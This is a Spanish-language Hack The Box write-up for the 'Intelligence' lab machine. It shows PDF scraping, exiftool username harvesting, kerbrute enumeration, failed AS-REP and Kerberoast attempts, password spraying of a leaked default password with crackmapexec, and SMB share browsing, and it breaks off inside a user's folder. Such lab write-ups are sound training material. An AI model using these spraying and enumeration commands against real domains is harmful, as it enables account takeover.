<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.248</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Email</span><span class="p">[</span><span class="n">contact</span><span class="vi">@intelligence</span><span class="p">.</span><span class="nf">htb</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.248</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Intelligence</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>En el apartado de las imágenes hay 2 botones los cuales nos dice Download son archivos .pdf este es su contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/2.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/intelligence/3.png" />
</p>

<ul>
  <li>Vamos a descargarlos para ver los metadatos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget http://10.10.10.248/documents/2020-01-01-upload.pdf
<span class="nt">--2024-08-05</span> 19:20:52--  http://10.10.10.248/documents/2020-01-01-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 <span class="o">(</span>26K<span class="o">)</span> <span class="o">[</span>application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf           100%[<span class="o">=======================================================&gt;]</span>  26.21K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    

2024-08-05 19:20:53 <span class="o">(</span>256 KB/s<span class="o">)</span> - ‘2020-01-01-upload.pdf’ saved <span class="o">[</span>26835/26835]

                                                                                                                                
❯ wget http://10.10.10.248/documents/2020-12-15-upload.pdf
<span class="nt">--2024-08-05</span> 19:21:00--  http://10.10.10.248/documents/2020-12-15-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 <span class="o">(</span>27K<span class="o">)</span> <span class="o">[</span>application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf           100%[<span class="o">=======================================================&gt;]</span>  26.60K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.1s    

2024-08-05 19:21:00 <span class="o">(</span>246 KB/s<span class="o">)</span> - ‘2020-12-15-upload.pdf’ saved <span class="o">[</span>27242/27242]
</code></pre></div></div>

<ul>
  <li>Encontramos el nombre de los creadores.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-01-01-upload.pdf
Directory                       : <span class="nb">.</span>
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 11:00:00-06:00
File Access Date/Time           : 2024:08:05 19:20:53-06:00
File Inode Change Date/Time     : 2024:08:05 19:20:53-06:00
File Permissions                : <span class="nt">-rw-rw-r--</span>
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

❯ exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.76
File Name                       : 2020-12-15-upload.pdf
Directory                       : <span class="nb">.</span>
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 11:00:00-06:00
File Access Date/Time           : 2024:08:05 19:21:00-06:00
File Inode Change Date/Time     : 2024:08:05 19:21:00-06:00
File Permissions                : <span class="nt">-rw-rw-r--</span>
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos los nombres de creadores lo mas probable es que sean usuarios del dominio pero podemos hacer Fuzzing para encontrar mas PDFs en caso de que los allá y descargarlos.</p>
  </li>
  <li>
    <p>Vamos a descargar solo los que existan para extraer los nombres de los creadores.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>2020..2022<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>j <span class="k">in</span> <span class="o">{</span>01..12<span class="o">}</span><span class="p">;</span> <span class="k">do for </span>k <span class="k">in</span> <span class="o">{</span>01..31<span class="o">}</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"http://10.10.10.248/documents/</span><span class="nv">$i</span><span class="s2">-</span><span class="nv">$j</span><span class="s2">-</span><span class="nv">$k</span><span class="s2">-upload.pdf"</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="k">done</span> | xargs <span class="nt">-n</span> 1 <span class="nt">-P</span> 20 wget
</code></pre></div></div>

<ul>
  <li>Como son demasiados usuarios vamos a filtrar por sus nombres y meterlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool <span class="k">*</span> .pdf | <span class="nb">grep</span> <span class="s2">"Creator"</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span>
William.Lee
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
Anita.Roberts
Teresa.Williamson
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Error: File not found - .pdf
Jason.Patterson
Stephanie.Young
Kaitlyn.Zimmerman
Travis.Evans
Kelly.Long
Danny.Matthews
Travis.Evans
Jessica.Moody
Thomas.Valenzuela
Anita.Roberts
Stephanie.Young
David.Reed
Jose.Williams
Veronica.Patel
Ian.Duncan
Richard.Williams
</code></pre></div></div>

<ul>
  <li>Como hay repeticiones vamos aplicar un <code class="language-plaintext highlighter-rouge">sort</code> para eliminar las repeticiones.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool <span class="k">*</span> .pdf | <span class="nb">grep</span> <span class="s2">"Creator"</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> | <span class="nb">sort</span> <span class="nt">-u</span>
Error: File not found - .pdf
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ exiftool <span class="k">*</span>.pdf | <span class="nb">grep</span> <span class="s2">"Creator"</span> | <span class="nb">awk</span> <span class="s1">'NF{print $NF}'</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> users.txt
</code></pre></div></div>

<ul>
  <li>Ahora vamos a comprobar que los usuarios sean validos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> dc.intelligence.htb <span class="nt">-d</span> intelligence.htb users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 08/05/24 - Ronnie Flathers @ropnop

2024/08/05 19:47:26 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/08/05 19:47:26 <span class="o">&gt;</span>  	dc.intelligence.htb:88

2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Anita.Roberts@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Ian.Duncan@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	David.Wilson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	David.Reed@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Brian.Baker@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Darryl.Harris@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Daniel.Shelton@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Brian.Morris@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	David.Mcbride@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Danny.Matthews@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jason.Wright@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jason.Patterson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jose.Williams@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Kelly.Long@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Kaitlyn.Zimmerman@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jennifer.Thomas@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	John.Coleman@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Jessica.Moody@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Richard.Williams@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Nicole.Brock@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Samuel.Richardson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Stephanie.Young@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Teresa.Williamson@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Scott.Scott@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Thomas.Valenzuela@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Travis.Evans@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Veronica.Patel@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Thomas.Hall@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	Tiffany.Molina@intelligence.htb
2024/08/05 19:47:26 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	William.Lee@intelligence.htb
</code></pre></div></div>

<ul>
  <li>
    <p>Son existentes así que vamos a probar un <code class="language-plaintext highlighter-rouge">ASREPRoast</code> <a href="https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html">https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html</a>.</p>
  </li>
  <li>
    <p>Ningún usuario es vulnerable.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers intelligence.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] User Anita.Roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Brian.Baker doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Brian.Morris doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Shelton doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Danny.Matthews doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Darryl.Harris doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User David.Mcbride doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User David.Reed doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User David.Wilson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Ian.Duncan doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jason.Patterson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jason.Wright doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Jennifer.Thomas doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jessica.Moody doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User John.Coleman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Jose.Williams doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Kaitlyn.Zimmerman doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Kelly.Long doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Nicole.Brock doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Williams doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Samuel.Richardson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Scott.Scott doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Stephanie.Young doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Teresa.Williamson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Thomas.Hall doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Thomas.Valenzuela doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Tiffany.Molina doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User Travis.Evans doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User Veronica.Patel doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User William.Lee doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
</code></pre></div></div>

<ul>
  <li>En los PDFs sabemos que tienen contenido así que vamos a utilizar la siguiente herramienta para ver si en los textos hay alguna contraseña <a href="https://github.com/jalan/pdftotext">https://github.com/jalan/pdftotext</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="k">for </span>file <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$file</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">grep</span> <span class="nt">-v</span> users.txt | <span class="k">while </span><span class="nb">read </span>filename<span class="p">;</span> <span class="k">do </span>pdftotext <span class="nv">$filename</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<ul>
  <li>Si examinamos los <code class="language-plaintext highlighter-rouge">.txt</code> vemos una contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: 2020-06-04-upload.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ New Account Guide
   2   │ Welcome to Intelligence Corp!
   3   │ Please login using your username and the default password of:
   4   │ NewIntelligenceCorpUser9876
   5   │ After logging <span class="k">in </span>please change your password as soon as possible.
   6   │ 
   7   │ ^L
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre></div></div>

<h2 id="smb">SMB</h2>

<ul>
  <li>Como tenemos una contraseña podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> para saber de quien es la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> users.txt <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\A</span>nita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\B</span>rian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\B</span>rian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>aniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>anny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>arryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>avid.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>avid.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\D</span>avid.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\I</span>an.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>essica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ohn.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\J</span>ose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\K</span>aitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\K</span>elly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\N</span>icole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\R</span>ichard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\S</span>amuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\S</span>cott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\S</span>tephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\T</span>eresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\T</span>homas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>-] intelligence.htb<span class="se">\T</span>homas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               <span class="o">[</span>+] intelligence.htb<span class="se">\T</span>iffany.Molina:NewIntelligenceCorpUser9876 
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /bin/cat creds.txt
Tiffany.Molina:NewIntelligenceCorpUser9876 
</code></pre></div></div>

<ul>
  <li>Las credenciales son para el protocolo <code class="language-plaintext highlighter-rouge">SMB</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.248 <span class="nt">-u</span> Tiffany.Molina <span class="nt">-p</span> <span class="s2">"NewIntelligenceCorpUser9876"</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:intelligence.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.248    445    DC               <span class="o">[</span>+] intelligence.htb<span class="se">\T</span>iffany.Molina:NewIntelligenceCorpUser9876 
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos credenciales validas podemos probar un Kerberoasting Attack para solicitar un <code class="language-plaintext highlighter-rouge">TGS</code> <a href="https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast">https://book.hacktricks.xyz/v/es/windows-hardening/active-directory-methodology/kerberoast</a>.</p>
  </li>
  <li>
    <p>Pero no es vulnerable.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetUserSPNs intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

No entries found!
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Podemos enumerar por <code class="language-plaintext highlighter-rouge">SMB</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.248 <span class="nt">-u</span> <span class="s1">'Tiffany.Molina'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="se">\]</span> Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>|] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>/] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span>-] Checking <span class="k">for </span>open ports...                                                                                                  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB connections<span class="o">(</span>s<span class="o">)</span> and 1 authenticated session<span class="o">(</span>s<span class="o">)</span>                                                      
                                                                                                                             
<span class="o">[</span>+] IP: 10.10.10.248:445	Name: dc.intelligence.htb 	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closed 1 connections                                                                        
</code></pre></div></div>

<ul>
  <li>Vamos a ver que es lo que hay dentro de Users.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-U</span> Tiffany.Molina //10.10.10.248/Users
Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\T</span>iffany.Molina]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                  DR        0  Sun Apr 18 20:20:26 2021
  ..                                 DR        0  Sun Apr 18 20:20:26 2021
  Administrator                       D        0  Sun Apr 18 19:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 02:21:46 2018
  Default                           DHR        0  Sun Apr 18 21:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 02:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 02:11:27 2018
  Public                             DR        0  Sun Apr 18 19:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 20:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 19:51:46 2021

		3770367 blocks of size 4096. 1437659 blocks available
smb: <span class="se">\&gt;</span> 
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">cd </span>Tiffany.Molina<span class="se">\</span>
smb: <span class="se">\T</span>iffany.Molina<span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Sun Apr 18 19:51:46 2021
  ..                                  D        0  Sun Apr 18 19:51:46 2021
